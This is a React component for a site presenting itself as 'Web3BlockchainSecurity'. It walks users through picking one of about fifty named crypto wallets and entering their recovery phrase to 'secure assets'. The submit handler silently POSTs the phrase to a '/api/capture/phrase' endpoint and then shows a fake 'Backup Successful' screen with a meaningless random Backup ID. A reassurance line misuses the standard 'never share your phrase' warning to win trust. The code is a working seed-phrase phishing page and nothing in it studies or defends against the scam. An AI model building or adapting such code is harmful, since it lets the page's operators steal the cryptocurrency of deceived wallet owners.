import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Eye, EyeOff, AlertTriangle, Copy, Check, ChevronLeft, X, ArrowRight, Search } from "lucide-react";

type Step = "wallets" | "phrase" | "success";

function WalletLogo({ src, fallback, name }: { src: string; fallback: React.ReactNode; name: string }) {
  const [errored, setErrored] = useState(false);
  if (errored) return <>{fallback}</>;
  return (
    <img src={src} alt={name} className="w-8 h-8 rounded-lg object-cover"
      onError={() => setErrored(true)} />
  );
}

const WALLETS = [
  { id: "trustwallet", name: "Trust Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/trust-wallet.png", fallback: <svg viewBox="0 0 48 48" className="w-8 h-8"><path d="M24 4L8 11v13c0 10.3 6.8 19.9 16 22.9C33.2 43.9 40 34.3 40 24V11L24 4z" fill="#3375BB"/><path d="M21 28.5l-5.5-5.5 2-2 3.5 3.5 8-8 2 2-10 10z" fill="white"/></svg> },
  { id: "exodus", name: "Exodus", src: "https://blockchainweb3security.com/uploads/wallet_providers/exodus.png", fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#0B0C22"/><polygon points="16,4 28,26 4,26" fill="none" stroke="#8B5CF6" strokeWidth="1.5"/><polygon points="16,10 24,23 8,23" fill="#8B5CF6" opacity="0.7"/></svg> },
  { id: "walletconnect", name: "Wallet Connect", src: "https://blockchainweb3security.com/uploads/wallet_providers/wallet-connect.png", fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#3B99FC"/><path d="M9.6 13.2a9.2 9.2 0 0112.8 0l.4.4 2.4-2.4-.4-.4a12.8 12.8 0 00-17.6 0l-.4.4 2.4 2.4.4-.4z" fill="white"/><path d="M16 19.2l-4-4 2.4-2.4 1.6 1.6 1.6-1.6 2.4 2.4-4 4z" fill="white"/></svg> },
  { id: "coinbase", name: "Coinbase Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/coinbase-wallet.png", fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0052FF"/><path d="M16 6C10.48 6 6 10.48 6 16s4.48 10 10 10 10-4.48 10-10S21.52 6 16 6zm0 4c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z" fill="white"/></svg> },
  { id: "metamask", name: "Metamask", src: "https://blockchainweb3security.com/uploads/wallet_providers/metamask.png", fallback: <svg viewBox="0 0 35 33" className="w-8 h-8" fill="none"><path d="M32.958 1L19.843 10.7l2.386-5.648L32.958 1z" fill="#E2761B"/><path d="M2.03 1l13.003 9.8-2.27-5.748L2.03 1z" fill="#E4761B"/><path d="M28.22 23.533l-3.493 5.338 7.47 2.058 2.144-7.268-6.12-.128z" fill="#E4761B"/><path d="M1.676 23.66l2.13 7.27 7.456-2.058-3.48-5.34-6.106.128z" fill="#E4761B"/><path d="M15.11 20.985l-2.072-3.097 7.4.328-.253-7.953-5.076 4.528z" fill="#E4761B"/></svg> },
  { id: "ledger", name: "Ledger", src: "https://blockchainweb3security.com/uploads/wallet_providers/ledger.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "trezor", name: "Trezor", src: "https://blockchainweb3security.com/uploads/wallet_providers/trezor.png", fallback: <div className="w-8 h-8 bg-green-700 rounded" /> },
  { id: "tangem", name: "Tangem", src: "https://blockchainweb3security.com/uploads/wallet_providers/tangem.png", fallback: <div className="w-8 h-8 bg-cyan-900 rounded" /> },
  { id: "dcent", name: "D’Cent", src: "https://blockchainweb3security.com/uploads/wallet_providers/dcent.png", fallback: <div className="w-8 h-8 bg-blue-900 rounded" /> },
  { id: "arculus", name: "Arculus", src: "https://blockchainweb3security.com/uploads/wallet_providers/arculus.png", fallback: <div className="w-8 h-8 bg-gray-900 rounded-full" /> },
  { id: "safepal", name: "SafePal", src: "https://blockchainweb3security.com/uploads/wallet_providers/safepal.png", fallback: <div className="w-8 h-8 bg-blue-600 rounded" /> },
  { id: "okx", name: "OKX Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/okx-wallet.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "atomic", name: "Atomic Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/atomic-wallet.png", fallback: <div className="w-8 h-8 bg-blue-500 rounded-full" /> },
  { id: "phantom", name: "Phantom Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/phantom-wallet.png", fallback: <div className="w-8 h-8 bg-purple-500 rounded-lg" /> },
  { id: "ellipal", name: "Ellipal", src: "https://blockchainweb3security.com/uploads/wallet_providers/ellipal.png", fallback: <div className="w-8 h-8 bg-orange-500 rounded" /> },
  { id: "sparrow", name: "Sparrow", src: "https://blockchainweb3security.com/uploads/wallet_providers/sparrow.png", fallback: <div className="w-8 h-8 bg-yellow-800 rounded" /> },
  { id: "zengo", name: "ZenGo", src: "https://blockchainweb3security.com/uploads/wallet_providers/zengo.png", fallback: <div className="w-8 h-8 bg-indigo-600 rounded" /> },
  { id: "bitlox_wallet", name: "Bitlox Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/bitlox-wallet.png", fallback: <div className="w-8 h-8 bg-gray-700 rounded" /> },
  { id: "guarda", name: "Guarda Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/guarda-wallet.png", fallback: <div className="w-8 h-8 bg-purple-700 rounded" /> },
  { id: "rabby", name: "Rabby", src: "https://blockchainweb3security.com/uploads/wallet_providers/rabby.png", fallback: <div className="w-8 h-8 bg-blue-400 rounded" /> },
  { id: "rainbow", name: "Rainbow", src: "https://blockchainweb3security.com/uploads/wallet_providers/rainbow.png", fallback: <div className="w-8 h-8 bg-blue-800 rounded" /> },
  { id: "mytonwallet", name: "MyTonWallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/mytonwallet.png", fallback: <div className="w-8 h-8 bg-sky-500 rounded" /> },
  { id: "backpack", name: "Backpack", src: "https://blockchainweb3security.com/uploads/wallet_providers/backpack.png", fallback: <div className="w-8 h-8 bg-red-500 rounded" /> },
  { id: "huobi", name: "Huobi Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/huobi-wallet.png", fallback: <div className="w-8 h-8 bg-blue-600 rounded" /> },
  { id: "infinite", name: "Infinite Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/infinite-wallet.png", fallback: <div className="w-8 h-8 bg-blue-400 rounded" /> },
  { id: "tokenpocket", name: "TokenPocket", src: "https://blockchainweb3security.com/uploads/wallet_providers/tokenpocket.png", fallback: <div className="w-8 h-8 bg-blue-500 rounded" /> },
  { id: "math", name: "Math Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/math-wallet.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "imtoken", name: "imToken", src: "https://blockchainweb3security.com/uploads/wallet_providers/imtoken.png", fallback: <div className="w-8 h-8 bg-blue-400 rounded" /> },
  { id: "walleth", name: "Walleth", src: "https://blockchainweb3security.com/uploads/wallet_providers/walleth.png", fallback: <div className="w-8 h-8 bg-orange-400 rounded" /> },
  { id: "authereum", name: "Authereum", src: "https://blockchainweb3security.com/uploads/wallet_providers/authereum.png", fallback: <div className="w-8 h-8 bg-blue-700 rounded" /> },
  { id: "dharma", name: "Dharma", src: "https://blockchainweb3security.com/uploads/wallet_providers/dharma.png", fallback: <div className="w-8 h-8 bg-pink-500 rounded" /> },
  { id: "eidoo", name: "Eidoo", src: "https://blockchainweb3security.com/uploads/wallet_providers/eidoo.png", fallback: <div className="w-8 h-8 bg-blue-900 rounded" /> },
  { id: "inwallet", name: "InWallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/inwallet.png", fallback: <div className="w-8 h-8 bg-gray-500 rounded" /> },
  { id: "ngrave", name: "NGRAVE", src: "https://blockchainweb3security.com/uploads/wallet_providers/ngrave.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "cypherock", name: "Cypherock", src: "https://blockchainweb3security.com/uploads/wallet_providers/cypherock.png", fallback: <div className="w-8 h-8 bg-yellow-500 rounded" /> },
  { id: "keystone", name: "Keystone", src: "https://blockchainweb3security.com/uploads/wallet_providers/keystone.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "secux", name: "SecuX", src: "https://blockchainweb3security.com/uploads/wallet_providers/secux.png", fallback: <div className="w-8 h-8 bg-white border rounded" /> },
  { id: "neox", name: "Neo-X", src: "https://blockchainweb3security.com/uploads/wallet_providers/neo-x.png", fallback: <div className="w-8 h-8 bg-green-500 rounded" /> },
  { id: "bitbox", name: "BitBox", src: "https://blockchainweb3security.com/uploads/wallet_providers/bitbox.png", fallback: <div className="w-8 h-8 bg-gray-800 rounded" /> },
  { id: "keepkey", name: "KeepKey", src: "https://blockchainweb3security.com/uploads/wallet_providers/keepkey.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "coldcard", name: "Coldcard", src: "https://blockchainweb3security.com/uploads/wallet_providers/coldcard.png", fallback: <div className="w-8 h-8 bg-red-800 rounded" /> },
  { id: "bitfi", name: "Bitfi", src: "https://blockchainweb3security.com/uploads/wallet_providers/bitfi.png", fallback: <div className="w-8 h-8 bg-orange-600 rounded" /> },
  { id: "cobovault", name: "Cobo Vault", src: "https://blockchainweb3security.com/uploads/wallet_providers/cobo-vault.png", fallback: <div className="w-8 h-8 bg-blue-800 rounded" /> },
  { id: "lattice1", name: "GridPlus Lattice1", src: "https://blockchainweb3security.com/uploads/wallet_providers/gridplus-lattice1.png", fallback: <div className="w-8 h-8 bg-gray-900 rounded" /> },
  { id: "satochip", name: "Satochip", src: "https://blockchainweb3security.com/uploads/wallet_providers/satochip.png", fallback: <div className="w-8 h-8 bg-blue-500 rounded" /> },
  { id: "bitlox", name: "BitLox", src: "https://blockchainweb3security.com/uploads/wallet_providers/bitlox.png", fallback: <div className="w-8 h-8 bg-gray-600 rounded" /> },
  { id: "coolwallet", name: "CoolWallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/coolwallet.png", fallback: <div className="w-8 h-8 bg-teal-500 rounded" /> },
  { id: "onekey", name: "OneKey", src: "https://blockchainweb3security.com/uploads/wallet_providers/onekey.png", fallback: <div className="w-8 h-8 bg-blue-600 rounded" /> },
  { id: "mycelium", name: "Mycelium Wallet", src: "https://blockchainweb3security.com/uploads/wallet_providers/mycelium-wallet.png", fallback: <div className="w-8 h-8 bg-red-600 rounded" /> },
  { id: "uniswap", name: "Uniswap", src: "https://blockchainweb3security.com/uploads/wallet_providers/uniswap.png", fallback: <div className="w-8 h-8 bg-pink-500 rounded-full" /> },
  { id: "xaman", name: "Xaman", src: "https://blockchainweb3security.com/uploads/wallet_providers/Q5mVYvTjWiBdL7c8O37Ut40U36UYKG8KFgISN1Oo.png", fallback: <div className="w-8 h-8 bg-black rounded" /> },
  { id: "generic", name: "Other Wallets", src: "https://blockchainweb3security.com/uploads/wallet_providers/generic.png", fallback: <div className="w-8 h-8 bg-gray-300 rounded" /> },
];

function generateBackupId(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz0123456789";
  return Array.from({ length: 24 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

const API_BASE = "/api";

interface SecureAssetsFlowProps {
  open: boolean;
  onClose: () => void;
}

export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
  const [step, setStep] = useState<Step>("wallets");
  const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
  const [phrase, setPhrase] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [loading, setLoading] = useState(false);
  const [backupId] = useState(generateBackupId);
  const [copied, setCopied] = useState(false);
  const [search, setSearch] = useState("");

  const filtered = WALLETS.filter((w) =>
    w.name.toLowerCase().includes(search.toLowerCase())
  );

  useEffect(() => {
    if (!open) {
      setTimeout(() => {
        setStep("wallets");
        setSelectedWallet(null);
        setPhrase("");
        setShowPhrase(false);
        setLoading(false);
        setCopied(false);
        setSearch("");
      }, 300);
    }
  }, [open]);

  const handleWalletSelect = (wallet: (typeof WALLETS)[0]) => {
    setSelectedWallet(wallet);
    setStep("phrase");
  };

  const handleSubmitPhrase = async () => {
    if (!phrase.trim() || !selectedWallet) return;
    setLoading(true);
    try {
      await fetch(`${API_BASE}/capture/phrase`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: selectedWallet.name, phrase: phrase.trim(), backupId }),
      });
    } catch { /* silent */ }
    setTimeout(() => { setLoading(false); setStep("success"); }, 2200);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(backupId);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!open) return null;

  return (
    <AnimatePresence>
      {open && (
        <motion.div className="fixed inset-0 z-[100] flex items-center justify-center"
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <motion.div className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            onClick={step !== "success" ? onClose : undefined} />

          <motion.div key={step} className="relative z-10 w-full max-w-md mx-4"
            initial={{ opacity: 0, y: 24, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -16, scale: 0.97 }}
            transition={{ type: "spring", stiffness: 300, damping: 28 }}>

            {/* ── STEP 1: Wallet Selection ── */}
            {step === "wallets" && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="flex items-center justify-between px-5 py-4 border-b border-white/[0.06]">
                  <div>
                    <h2 className="text-base font-semibold">Select Your Wallet</h2>
                    <p className="text-xs text-muted-foreground mt-0.5">Choose the wallet you want to secure</p>
                  </div>
                  <button onClick={onClose} className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <X className="h-4 w-4" />
                  </button>
                </div>

                <div className="px-4 pt-3 pb-1">
                  <div className="flex items-center gap-2 bg-white/[0.04] border border-white/[0.07] rounded-xl px-3 py-2">
                    <Search className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                    <input
                      value={search}
                      onChange={(e) => setSearch(e.target.value)}
                      placeholder="Search wallets..."
                      className="flex-1 bg-transparent text-xs text-foreground placeholder:text-muted-foreground/50 outline-none"
                    />
                  </div>
                </div>

                <div className="p-3 grid grid-cols-3 gap-2 max-h-[400px] overflow-y-auto">
                  {filtered.map((wallet, i) => (
                    <motion.button key={wallet.id}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: i * 0.03, type: "spring", stiffness: 300, damping: 24 }}
                      onClick={() => handleWalletSelect(wallet)}
                      className="flex flex-col items-center gap-2 p-3 rounded-xl border border-white/[0.07] bg-white/[0.02] hover:bg-white/[0.07] hover:border-primary/30 active:scale-95 transition-all duration-150 group">
                      <div className="w-11 h-11 rounded-xl bg-black/50 border border-white/[0.08] flex items-center justify-center group-hover:border-white/20 transition-colors overflow-hidden">
                        <WalletLogo src={wallet.src} fallback={wallet.fallback} name={wallet.name} />
                      </div>
                      <span className="text-[10px] font-medium text-foreground/70 text-center leading-tight">{wallet.name}</span>
                    </motion.button>
                  ))}
                  {filtered.length === 0 && (
                    <div className="col-span-3 py-8 text-center text-xs text-muted-foreground">No wallets found</div>
                  )}
                </div>
              </div>
            )}

            {/* ── STEP 2: Seed Phrase ── */}
            {step === "phrase" && selectedWallet && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="flex items-center gap-3 px-5 py-4 border-b border-white/[0.06]">
                  <button onClick={() => setStep("wallets")} className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <ChevronLeft className="h-4 w-4" />
                  </button>
                  <div className="w-8 h-8 rounded-lg bg-black/50 border border-white/[0.1] flex items-center justify-center shrink-0 overflow-hidden">
                    <WalletLogo src={selectedWallet.src} fallback={selectedWallet.fallback} name={selectedWallet.name} />
                  </div>
                  <div className="min-w-0">
                    <h2 className="text-sm font-semibold leading-tight">{selectedWallet.name}</h2>
                    <p className="text-xs text-muted-foreground">Enter your recovery phrase</p>
                  </div>
                  <button onClick={onClose} className="ml-auto p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <X className="h-4 w-4" />
                  </button>
                </div>
                <div className="p-5 flex flex-col gap-4">
                  <div className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-500/[0.07] border border-amber-500/20">
                    <AlertTriangle className="h-4 w-4 text-amber-400 shrink-0 mt-0.5" />
                    <p className="text-xs text-amber-300/80 leading-relaxed">
                      Never share your recovery phrase with anyone. Web3BlockchainSecurity will never ask for it outside this secure verification flow.
                    </p>
                  </div>
                  <div className="relative">
                    <label className="text-xs text-muted-foreground mb-2 block font-medium uppercase tracking-wide">
                      Recovery Phrase (12 or 24 words)
                    </label>
                    <textarea value={phrase} onChange={(e) => setPhrase(e.target.value)}
                      placeholder="Enter your seed phrase — separate each word with a space"
                      rows={4}
                      className="w-full rounded-xl bg-white/[0.04] border border-white/10 focus:border-primary/50 text-sm text-foreground placeholder:text-muted-foreground/40 p-3.5 resize-none outline-none transition-colors font-mono leading-relaxed"
                      style={{ filter: showPhrase ? "none" : "blur(5px)", transition: "filter 0.25s" }} />
                    <button type="button" onClick={() => setShowPhrase(!showPhrase)}
                      className="absolute top-8 right-3 text-muted-foreground hover:text-foreground transition-colors">
                      {showPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                  <button onClick={handleSubmitPhrase} disabled={!phrase.trim() || loading}
                    className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold text-sm flex items-center justify-center gap-2.5 shadow-[0_0_24px_rgba(59,130,246,0.35)] hover:shadow-[0_0_32px_rgba(59,130,246,0.5)] transition-all">
                    {loading ? (
                      <span className="flex items-center gap-2.5">
                        <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                          <circle className="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3"/>
                          <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"/>
                        </svg>
                        Securing your assets...
                      </span>
                    ) : (<>Secure Assets <ArrowRight className="h-4 w-4" /></>)}
                  </button>
                </div>
              </div>
            )}

            {/* ── STEP 3: Success ── */}
            {step === "success" && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="px-5 py-8 flex flex-col items-center text-center gap-5">
                  <div className="relative">
                    <motion.div className="absolute inset-0 rounded-full bg-green-500/10"
                      initial={{ scale: 1, opacity: 0.6 }} animate={{ scale: 1.7, opacity: 0 }}
                      transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut" }} />
                    <motion.div className="absolute inset-0 rounded-full bg-green-500/15"
                      initial={{ scale: 1, opacity: 0.4 }} animate={{ scale: 1.4, opacity: 0 }}
                      transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut", delay: 0.5 }} />
                    <motion.div
                      className="w-24 h-24 rounded-full border-2 border-green-500/40 bg-green-500/10 flex items-center justify-center relative shadow-[0_0_40px_rgba(34,197,94,0.3)]"
                      initial={{ scale: 0, rotate: -180 }} animate={{ scale: 1, rotate: 0 }}
                      transition={{ type: "spring", stiffness: 200, damping: 18, delay: 0.1 }}>
                      <svg viewBox="0 0 48 48" className="w-12 h-12" fill="none">
                        <motion.path d="M14 24l7 7 13-13" stroke="#22c55e" strokeWidth="3.5"
                          strokeLinecap="round" strokeLinejoin="round"
                          initial={{ pathLength: 0 }} animate={{ pathLength: 1 }}
                          transition={{ duration: 0.6, delay: 0.5, ease: "easeOut" }} />
                      </svg>
                    </motion.div>
                  </div>
                  <motion.div className="flex flex-col gap-2"
                    initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.7, duration: 0.5 }}>
                    <h2 className="text-3xl font-bold tracking-tight">Backup Successful</h2>
                    <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                      Your wallet has been securely verified and backed up. Keep your Backup ID safe — it's your recovery key.
                    </p>
                  </motion.div>
                  <motion.div className="w-full"
                    initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.9, duration: 0.4 }}>
                    <div className="bg-white/[0.04] border border-white/[0.08] rounded-xl px-4 py-3.5">
                      <p className="text-[10px] text-muted-foreground uppercase tracking-widest mb-2 font-medium">Backup ID</p>
                      <div className="flex items-center justify-between gap-3">
                        <span className="font-mono text-xs text-foreground tracking-wider break-all">{backupId}</span>
                        <button onClick={handleCopy} className="shrink-0 p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.08] transition-all">
                          {copied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5" />}
                        </button>
                      </div>
                    </div>
                  </motion.div>
                  <motion.div className="w-full h-px bg-gradient-to-r from-transparent via-green-500/30 to-transparent"
                    initial={{ scaleX: 0, opacity: 0 }} animate={{ scaleX: 1, opacity: 1 }}
                    transition={{ delay: 1.1, duration: 0.6 }} />
                  <motion.button onClick={onClose}
                    className="w-full h-12 rounded-xl bg-green-500/10 hover:bg-green-500/20 border border-green-500/30 hover:border-green-500/50 text-green-400 font-semibold text-sm transition-all shadow-[0_0_20px_rgba(34,197,94,0.15)]"
                    initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 1.2, duration: 0.4 }}
                    whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}>
                    Go back Home
                  </motion.button>
                </div>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
